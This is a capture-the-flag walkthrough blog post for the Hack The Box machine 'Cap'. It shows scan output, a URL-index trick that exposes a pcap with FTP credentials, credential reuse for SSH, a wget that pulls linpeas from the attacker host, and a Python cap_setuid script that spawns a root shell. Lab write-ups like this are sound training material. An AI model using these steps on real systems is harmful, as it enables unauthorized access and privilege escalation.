---
layout: post
title: "HTB-Cap"
---

<p>In Cap, we found a pcap file exposing FTP creds, logged in for user access, exploited Python’s cap_setuid to run a script as root, and obtained the root flag.</p>

<h2>Introduction</h2>
<p>In this post, I will demonstrate the exploitation of a fairly easy machine called "Cap" on hack the box. Overall, it was a fun but simple experience. A perfect entry level box!</p>
<h2> Step 1: running an Nmap scan on the target</h2>
<p>As always, we start with an Nmap scan on the target. I like to use the options -sC and -sV to run some Nmap scripts and do service detection, respectively. This allows us to capture a lot of information as a starting point.</p>
<p>We get the following output:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.10.10.245 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 05:20 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 39.46% done; ETC: 05:20 (0:00:05 remaining)
Nmap scan report for 10.10.10.245
Host is up (0.0096s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
</pre>

<p> In this box, we have a webserver running gunicorn as well as ftp and ssh on port 80, 21 and 22 respectively.</p>

<h2>Step 2: Attempting anonymous ftp login</h2>
<p>When I see an active ftp service, the first thing i like to do is attempt to do an anonymous login to determine whether some important files are exposed. However, this time it did not work.
<pre>
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
</pre>

<h2>Step 3: Enumerating the website</h2>
<p>Next, I started with exploring the website. The home page did not seem all that interesting.</p>
<img src="/images/cap/cap_site.webp" alt="Cap Home Page" class="postImage">

<h2>Step 4: Gaining access</h2>

<p>However, the Security Snapshot page seemed very interesting as we are able to download pcap files. interestingly, the pcap file we download changes alongside the url. Specifically, the URL is: http://IP/data/1. if we download the pcap file, we get 1.pcap, which is empty. Therefore; i tried increasing the number in the URL from 1 to 2 and so on. However, this resulted in empty pcap files. The next thing i tried was to decrement the number form 1 to 0. Bingo, we get a pcap file which is not empty.</p>
<img src="/images/cap/cap_data0.webp" alt="Retrieving a non-empty pcap file" class="postImage">

<p> Examination of the pcap file with Wireshark exposes some ftp credentials.</p>
<img src="/images/cap/cap_wireshark_username.webp" alt="ftp Username Wireshark" class="postImage">
<img src="/images/cap/cap_wireshark_password.webp" alt ="ftp Password Wireshark" class="postImage">

<p>Logging in to the ftp server with those credentials, the user flag was obtained</p>
<pre>
└─$ ftp 10.10.10.245                                               
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||19989|)
150 Here comes the directory listing.
-rwxrwxr-x    1 1001     1001       956174 Aug 08 19:43 linpeas.sh
drwxr-xr-x    3 1001     1001         4096 Aug 15 09:38 snap
-r--------    1 1001     1001           33 Aug 15 09:33 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||50720|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |********************************************************************************************************************************************|    33        1.25 MiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (3.54 KiB/s)
ftp> 
</pre>

<p>Let's try the same credentials to login using ssh. Bingo, we have now user access to the machine</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ ssh nathan@10.10.10.245
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug 15 10:25:16 UTC 2025

  System load:           0.12
  Usage of /:            36.7% of 8.73GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             247
  Users logged in:       1
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:fe94:f400

  => There are 4 zombie processes.

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Aug 15 10:11:41 2025 from 10.10.14.211
nathan@cap:~$ 
</pre>

<h2>Step 5: Privilege escalation: Gaining root on the box</h2>
<p>Next, we need to do some privilege escalation to gain root and the root.txt flag. At first sight, i did not find anything that stands out that could be used to gain root. Therefore, I decided to run Linpeas on the machine to retrieve more information. Linpeas is a bash script which gathers information and identifies possible vectors for privilege escalation</p>
<p>In order to get Linpeas on the box, we need to set up a python http server on our attacking kali machine. To do this, navigate to the directory where Linpeas is located and type the following command:</p>
<pre>
python3 -m http.server 9000
</pre>
<p>Next, on the victim machine, navigate to the tmp directory (write privileges needed) and retrieve the file using wget:</p>
<pre>
wget IP_ATTACKING_MACHINE:9000/linpeas.sh
</pre>
<p> running linpeas, we get a lot of output. The most interesting seems that python3.8 has cap_setuid set. This capability allows a process to change its uid. Therefore, we can misuse this capability to gain a root shell by creating a very simple python script</p>
<pre>
import os
print("setting uid to 0")
os.setuid(0)
print("spawning a shell as root")
os.system('/bin/bash')
</pre>
<p>So what does this exactly do? Firstly, it sets the uid of the process (our python script) to 0 meaning that it is essentially being run as root (root always has uid 0). Now that our process runs as root, we spawn a bash shell. Because our process/ python script was ran as root, our bash shell is also running as root.</p>
<p>Congratulations, you have successfully rooted this box!</p>
<h2>Final thoughts</h2>
<p>In general, this was a fun but quite easy box. Therefore, it's a perfect starting point for beginners who are looking for an introduction to the methodology. If you are looking for more of such beginner friendly boxes. I would advise to tackle some easy boxes on TryHackme as they are quite similar</p>
<a href="/">Go to the Home Page</a>
